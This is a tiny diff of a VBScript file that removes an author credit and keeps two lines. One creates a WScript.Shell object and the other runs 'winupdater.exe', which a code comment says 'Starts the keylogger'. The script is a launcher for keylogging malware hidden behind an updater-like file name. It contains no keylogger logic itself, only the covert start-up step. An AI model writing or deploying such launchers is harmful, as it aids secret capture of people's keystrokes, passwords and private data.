@@ -1,7 +1,3 @@
- 
- 'By: Kat9_123
- 
- 
 Set shell=CreateObject("WScript.Shell") 'Sets the shell
 
 shell.Run "winupdater.exe" 'Starts the keylogger
